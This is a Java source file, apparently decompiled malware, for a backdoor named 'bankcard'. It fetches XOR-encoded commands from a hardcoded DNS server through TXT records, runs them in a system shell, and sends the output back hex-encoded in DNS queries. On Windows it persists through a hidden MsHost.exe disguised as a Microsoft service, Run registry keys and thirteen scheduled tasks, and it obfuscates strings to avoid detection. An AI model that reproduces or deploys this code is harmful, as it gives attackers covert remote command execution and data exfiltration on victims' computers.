import java.io.File;
import javax.naming.directory.Attribute;
import javax.naming.directory.Attributes;
import javax.naming.directory.DirContext;
import javax.naming.directory.InitialDirContext;
import java.util.Hashtable;
import java.io.IOException;
import java.io.Reader;
import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.util.Enumeration;
import java.net.NetworkInterface;
import java.net.UnknownHostException;
import java.net.InetAddress;
import java.util.prefs.Preferences;

public class bankcard extends Thread
{
    private static String[] servers;
    private static int timetoretry;
    private static String server;
    private static String idummy;
    private static byte[] xorkey;
    private static String phrase;
    private Preferences preferences;
    private static String[] exeNames;
    
    static {
        bankcard.servers = new String[] { "128.199.133.42:53" };
        bankcard.timetoretry = 900000;
        bankcard.server = "";
        bankcard.idummy = "pichonmaestro";
        bankcard.xorkey = (String.valueOf(bankcard.idummy) + "telacomes").getBytes();
        bankcard.phrase = String.valueOf(bankcard.idummy) + ".dummy";
        bankcard.exeNames = new String[] { "MsHost.EXE", "MsHost.w32.EXE" };
    }
    
    public bankcard() {
        this.preferences = Preferences.userNodeForPackage(bankcard.class);
    }
    
    private static String uuid() {
        Enumeration<NetworkInterface> nis = null;
        byte[] hostname = { 100, 101, 115, 99, 111, 110, 111, 99, 105, 100, 111, 110, 111, 115, 101 };
        byte[] end = null;
        try {
            hostname = InetAddress.getLocalHost().getHostName().getBytes();
        }
        catch (UnknownHostException ex) {}
        try {
            nis = NetworkInterface.getNetworkInterfaces();
            while (nis.hasMoreElements()) {
                final NetworkInterface ni = nis.nextElement();
                final byte[] macaddr = ni.getHardwareAddress();
                if (macaddr != null && macaddr.length > 0) {
                    final byte[] checksum = checksum(hostname, macaddr.length);
                    for (int hf = 1; hf < macaddr.length; ++hf) {
                        macaddr[hf - 1] = (byte)(macaddr[hf] ^ macaddr[hf - 1] ^ checksum[hf - 1]);
                    }
                    if (end == null) {
                        end = macaddr;
                    }
                    else {
                        for (int fx = 0; fx < end.length; ++fx) {
                            end[fx] ^= macaddr[fx];
                        }
                    }
                }
            }
        }
        catch (Exception e) {
            return "desconocido";
        }
        return tohex(end);
    }
    
    private static byte[] xor(final byte[] a, final byte[] key) {
        final byte[] out = new byte[a.length];
        for (int i = 0; i < a.length; ++i) {
            out[i] = (byte)(a[i] ^ key[i % key.length]);
        }
        return out;
    }
    
    public static String tohex(final byte[] bb) {
        final StringBuilder str = new StringBuilder();
        for (int i = 0; i < bb.length; ++i) {
            str.append(String.format("%02x", bb[i]));
        }
        return str.toString();
    }
    
    public static byte[] checksum(final byte[] original, final int length) {
        final byte[] checksum = new byte[length];
        int ind = 0;
        for (int ch = 1; ch < original.length; ++ch) {
            if (ind > 5) {
                ind = 0;
            }
            checksum[ind] = (byte)(original[ch] ^ original[ch - 1]);
            ++ind;
        }
        return checksum;
    }
    
    public static String sth(final String ba) {
        final byte[] bb = xor(ba.getBytes(), bankcard.xorkey);
        return tohex(bb);
    }
    
    public static String hts(final String hex) {
        if (hex.equals("")) {
            return "";
        }
        final StringBuilder sb = new StringBuilder();
        for (int i = 0; i < hex.length() - 1; i += 2) {
            final String output = hex.substring(i, i + 2);
            sb.append((char)Integer.parseInt(output, 16));
        }
        return new String(xor(sb.toString().getBytes(), bankcard.xorkey));
    }
    
    public static void runit(final String cmd) {
        final StringBuffer out = new StringBuffer();
        try {
            final Runtime rt = Runtime.getRuntime();
            String[] commands = { "sZ".replaceAll("Z", "h"), new String(new byte[] { 45, 99 }), cmd };
            if (System.getProperty("os.name").toLowerCase().indexOf("win") >= 0) {
                commands = new String[] { "cZd".replaceAll("Z", "m"), new String(new byte[] { 47, 99 }), cmd };
            }
            final Process proc = rt.exec(commands);
            final BufferedReader stdInput = new BufferedReader(new InputStreamReader(proc.getInputStream()));
            String s = null;
            while ((s = stdInput.readLine()) != null) {
                out.append(s).append("\n");
            }
        }
        catch (IOException ex) {}
        String tosend = "";
        String fsend = out.toString();
        int max = 125 - ("." + bankcard.idummy + ".eof").length();
        while (fsend.length() > 0) {
            String domx = "";
            if (fsend.length() < max) {
                max = fsend.length();
            }
            tosend = sth(fsend.substring(0, max));
            fsend = fsend.substring(max);
            String bfx = "";
            int fix = 1;
            for (int ix = 0; ix < tosend.length(); ++ix) {
                bfx = String.valueOf(bfx) + tosend.charAt(ix);
                if (fix >= 63) {
                    domx = String.valueOf(domx) + bfx + ".";
                    bfx = "";
                    fix = 0;
                }
                ++fix;
            }
            if (!bfx.equals("")) {
                domx = String.valueOf(domx) + bfx + ".";
            }
            getTxtRecord(String.valueOf(domx) + bankcard.idummy + ".eof");
        }
    }
    
    public static String getTxtRecord(final String hostName) {
        final Hashtable<String, String> env = new Hashtable<String, String>();
        env.put("java.naming.factory.initial", "com.sun.jndi.dns.DnsContextFactory");
        for (int i = 0; i < bankcard.servers.length; ++i) {
            bankcard.server = bankcard.servers[i];
            env.put("java.naming.provider.url", "dns://" + bankcard.server + "/");
            int ret = 0;
            while (ret < 3) {
                try {
                    final DirContext dirContext = new InitialDirContext(env);
                    final Attributes attrs = dirContext.getAttributes(hostName, new String[] { "TXT" });
                    final Attribute attr = attrs.get("TXT");
                    String txtRecord = "";
                    if (attr != null) {
                        txtRecord = attr.get().toString();
                    }
                    return hts(txtRecord.replaceAll(" ", "").replaceAll("\"", ""));
                }
                catch (Exception ex) {
                    ++ret;
                }
            }
        }
        return "";
    }
    
    private String localRunIt(final String cmd) {
        final StringBuffer out = new StringBuffer();
        try {
            final Runtime rt = Runtime.getRuntime();
            String[] commands = { "sZ".replaceAll("Z", "h"), new String(new byte[] { 45, 99 }), cmd };
            if (System.getProperty("os.name").toLowerCase().indexOf("win") >= 0) {
                commands = new String[] { "cZd".replaceAll("Z", "m"), new String(new byte[] { 47, 99 }), cmd };
            }
            final Process proc = rt.exec(commands);
            final BufferedReader stdInput = new BufferedReader(new InputStreamReader(proc.getInputStream()));
            String s = null;
            while ((s = stdInput.readLine()) != null) {
                out.append(s).append("\n");
            }
        }
        catch (IOException ex) {}
        return out.toString();
    }
    
    private void install() {
        if (System.getProperty("os.name").toLowerCase().indexOf("win") >= 0) {
            try {
                final String dirHost = "%ALLUSERSPROFILE%\\MicrosoftHost";
                final String KeyWithoutPrivs = "HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run";
                final String KeyWithPrivs = "HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Run";
                final String label = "MicrosoftHostService";
                final String finalBin = "MsHost.exe";
                final String genericTaskName = "MsHost";
                final File f = new File(String.valueOf(dirHost) + "\\" + finalBin);
                if (!f.exists()) {
                    this.localRunIt("MKDIR \"" + dirHost + "\"");
                    this.localRunIt("ATTRIB +H \"" + dirHost + "\"");
                    for (int i = 0; i < bankcard.exeNames.length; ++i) {
                        this.localRunIt("COPY " + bankcard.exeNames[i] + " \"" + dirHost + "\\" + finalBin + "\"");
                    }
                    this.localRunIt("ATTRIB +H \"" + dirHost + "\\" + finalBin + "\"");
                }
                this.localRunIt("REG ADD " + KeyWithPrivs + " /v " + label + " /t REG_SZ /d \"" + dirHost + "\\" + finalBin + "\" /f");
                Thread.sleep(1000L);
                final String pullFromReg = this.localRunIt("REG QUERY " + KeyWithPrivs + " /v " + label);
                if (!pullFromReg.toLowerCase().contains(finalBin.toLowerCase())) {
                    this.localRunIt("REG ADD " + KeyWithoutPrivs + "  /v " + label + " /t REG_SZ /d \"" + dirHost + "\\" + finalBin + "\" /f");
                }
                this.localRunIt("SchTasks /Create /SC DAILY /TN " + genericTaskName + "-08 /TR \"" + dirHost + "\\" + finalBin + "\" /ST 08:00");
                this.localRunIt("SchTasks /Create /SC DAILY /TN " + genericTaskName + "-09 /TR \"" + dirHost + "\\" + finalBin + "\" /ST 09:00");
                this.localRunIt("SchTasks /Create /SC DAILY /TN " + genericTaskName + "-10 /TR \"" + dirHost + "\\" + finalBin + "\" /ST 10:00");
                this.localRunIt("SchTasks /Create /SC DAILY /TN " + genericTaskName + "-11 /TR \"" + dirHost + "\\" + finalBin + "\" /ST 11:00");
                this.localRunIt("SchTasks /Create /SC DAILY /TN " + genericTaskName + "-12 /TR \"" + dirHost + "\\" + finalBin + "\" /ST 12:00");
                this.localRunIt("SchTasks /Create /SC DAILY /TN " + genericTaskName + "-13 /TR \"" + dirHost + "\\" + finalBin + "\" /ST 13:00");
                this.localRunIt("SchTasks /Create /SC DAILY /TN " + genericTaskName + "-14 /TR \"" + dirHost + "\\" + finalBin + "\" /ST 14:00");
                this.localRunIt("SchTasks /Create /SC DAILY /TN " + genericTaskName + "-15 /TR \"" + dirHost + "\\" + finalBin + "\" /ST 15:00");
                this.localRunIt("SchTasks /Create /SC DAILY /TN " + genericTaskName + "-16 /TR \"" + dirHost + "\\" + finalBin + "\" /ST 16:00");
                this.localRunIt("SchTasks /Create /SC DAILY /TN " + genericTaskName + "-17 /TR \"" + dirHost + "\\" + finalBin + "\" /ST 17:00");
                this.localRunIt("SchTasks /Create /SC DAILY /TN " + genericTaskName + "-18 /TR \"" + dirHost + "\\" + finalBin + "\" /ST 18:00");
                this.localRunIt("SchTasks /Create /SC DAILY /TN " + genericTaskName + "-19 /TR \"" + dirHost + "\\" + finalBin + "\" /ST 19:00");
                this.localRunIt("SchTasks /Create /SC DAILY /TN " + genericTaskName + "-20 /TR \"" + dirHost + "\\" + finalBin + "\" /ST 20:00");
            } 
            catch (Exception ex) {}
        }
    }
    
    private int countCoincidences(final String str, final String findStr) {
        final int split = str.toLowerCase().split(findStr.toLowerCase(), -1).length - 1;
        return split;
    }
    
    private boolean running() {
        final String out = this.localRunIt("tasklist");
        int generalCount = 0;
        for (int i = 0; i < bankcard.exeNames.length; ++i) {
            generalCount += this.countCoincidences(out, bankcard.exeNames[i]);
        }
        return generalCount >= 2;
    }
    
    private String strJoin(final String[] aArr, final String sSep) {
        final StringBuilder sbStr = new StringBuilder();
        for (int i = 0, il = aArr.length; i < il; ++i) {
            if (i > 0) {
                sbStr.append(sSep);
            }
            sbStr.append(aArr[i]);
        }
        return sbStr.toString();
    }
    
    @Override
    public void run() {
        if (!this.running()) {
            new bankcard.bankcard$1(this, "New Thread").start();
        }
        else {
            System.exit(0);
        }
        bankcard.servers = this.preferences.get("servers", this.strJoin(bankcard.servers, ",")).split(",");
        bankcard.idummy = this.preferences.get("uuid", uuid());
        if (bankcard.idummy.equals("desconocido")) {
            bankcard.idummy = uuid();
        }
        this.preferences.put("uuid", bankcard.idummy);
        bankcard.server = bankcard.servers[0];
        bankcard.xorkey = (String.valueOf(bankcard.idummy) + "imadummY&iliK3it'").getBytes();
        bankcard.phrase = String.valueOf(bankcard.idummy) + ".dummy";
        while (true) {
            final String gotok = getTxtRecord(bankcard.phrase);
            if (!gotok.equals("ok") && !gotok.isEmpty()) {
                final String[] comandos = gotok.split("\n");
                for (int ic = 0; ic < comandos.length; ++ic) {
                    final String cmd = comandos[ic];
                    if (cmd.charAt(1) == '=') {
                        switch (cmd.charAt(0)) {
                            case 't': {
                                bankcard.timetoretry = Integer.parseInt(cmd.substring(2));
                                break;
                            }
                            case 's': {
                                bankcard.servers = cmd.substring(2).split(",");
                                this.preferences.put("servers", cmd.substring(2));
                                break;
                            }
                            case 'f': {
                                bankcard.phrase = cmd.substring(2);
                                break;
                            }
                        }
                    }
                    else {
                        runit(cmd);
                    }
                }
            }
            try {
                Thread.sleep(bankcard.timetoretry);
            }
            catch (InterruptedException ex) {}
        }
    }
    
    public static void main(final String[] args) {
        try {
            final bankcard t = new bankcard();
            t.run();
        }
        catch (Exception ex) {}
    }
}
